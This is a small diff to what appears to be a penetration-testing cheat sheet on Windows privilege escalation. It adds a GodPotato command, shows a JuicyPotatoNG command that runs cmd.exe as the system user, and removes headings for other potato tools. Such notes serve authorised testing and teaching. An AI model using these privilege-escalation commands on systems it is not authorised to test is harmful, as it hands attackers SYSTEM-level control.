@@ -14,9 +14,11 @@ What it does: Lets you impersonate system user
 ```
 JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
 ```
+### God Potato 
 
-### RogueWinRM
-### Sweet Potato
+```
+GodPotato -cmd "cmd /c whoami"
+```
 ### PrintSpoofer
 # SeLoadDriverPrivilege
 
